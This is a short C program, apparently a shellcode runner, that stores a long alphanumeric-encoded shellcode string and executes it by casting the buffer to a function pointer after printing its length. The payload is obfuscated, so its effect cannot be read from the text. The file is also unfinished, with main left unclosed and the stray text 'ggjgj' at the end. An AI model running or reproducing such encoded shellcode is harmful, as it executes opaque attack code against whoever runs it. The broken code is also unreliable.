#include<stdio.h>
#include<string.h>
char shellcode[]="iPcBlPSB9PgR1p3Bi0vRipvRVP6BEPURJ0uBVP5RF06RnpXRp0FRMPTBw0sRxp8RI08RJ0yB9pDR7PSRTPVBfp5RSp6BrpYRoP9Bn0fB0POR0POB0PUU0PUEi0UBi0URipERzpGRzpGRzpGRapGRwCOPjpERg0ERO0DUwCDPi0ERO0DUwCDP307RS03BO0DEi0UBwCDPipER107RO0CR3GDPjpER907RF03BO0DEi0UBwCDPwCDPwCDPwCDPd05Rs03RO0DUwCDPipERk07Rz0CR3GDPjpERG07R803BO0DEi0UBwCDPwCDPwCDPZ07RQ03BO0DEi0UBwCDPh07Rh03BO0DEi0UBwCDPt07Rt03BO0DEi0UBwCDPwCDPwCDPk05RB03RO0DUwCDPwCDPwCDPg0ERO0DUwCDPi0ERO0DUwCDPX07R803BO0DEi0UBwCDP605RO0DUiPUR5EEP5eEPtVGPcpMReaGVeBGVebGVehGVeYGVeXGVeRGVeRGVeFGVeFGVeBGVebGVKpMRGD7YtwUPw5mOHp4Bc0DR34OP3d4P3p4B3pSU54CP3jSUgm8P3pFU5dFP54CP4ExRzbQK4fFUSQQ4EURpSuKPTARpnoHbUEYodoKQpxRfqlFPiotaiovQYoGAkOGApEFQyLTbJhUbTEwWwqiOOpRfaQQVeXglbYrfDXwAkppFPHvBuTwWwqIORaqVgxWltFfGTAkoeJBidHWlEQFGDAiOQcSXquBLrLfMsCPtpoSBrMTzutuafDbkqArybLDoRYprbUgTpPPMsDtpubPzCeaDBwpmpMqfpPqGQsseedPopQrlCCfOfZFPejFPDzprpoPosDgJtocBbOpoqdtzFOBBPipnFOpbrAPsphwztosUrTBCFOPprAbSbSpwpdS3";

int main() {
	printf("Length:%d", strlen(shellcode));
	(*(void(*)())shellcode)();
	return 0;

 
ggjgj
